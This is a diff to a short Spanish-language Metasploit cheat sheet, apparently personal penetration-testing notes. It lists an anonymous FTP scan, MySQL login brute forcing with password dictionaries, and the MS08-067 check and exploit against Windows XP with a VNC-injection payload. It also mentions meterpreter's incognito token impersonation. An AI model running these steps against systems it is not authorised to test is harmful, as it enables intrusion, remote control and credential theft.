@@ -3,7 +3,10 @@ use scanner/ftp/anonymous (Comprueba si se puede acceder de forma anónima media
 use auxiliary/scanner/mysql/mysql_login (Fuerza bruta login MYSQL)
 	definir RHOSTS, PASS_FILE (diccionario), USER_FILE (usuarios)
 
-Para WinXP => use windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
+Para WinXP => 
+	use auxiliary/scanner/smb/ms08_067_check
+	use exploit/windows/smb/ms08_067_netapi => Puede que necesite bind_tcp
+	payload windows/vncinject/bind_tcp
 
 
 Dentro de meterpreter => use incognito
